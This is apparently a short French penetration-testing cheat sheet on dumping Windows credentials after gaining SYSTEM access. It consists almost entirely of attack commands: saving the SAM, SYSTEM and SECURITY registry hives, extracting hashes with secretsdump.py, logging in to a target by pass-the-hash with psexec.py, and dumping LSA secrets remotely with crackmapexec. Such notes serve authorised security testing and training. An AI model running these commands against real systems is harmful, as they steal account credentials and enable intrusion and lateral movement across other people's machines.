---
public: true # set to true to make the article publishable
---

## Sauvegarde des credentials quand on est system
```shell
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
```

```
secretdump.py local -sam sam.save -security security.save -system system.save LOCAL
```

``` shell 
psexec.py Administratur@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx
# ou
psexec.py Administratur@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
```

## Dump à distance 

```
crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa
```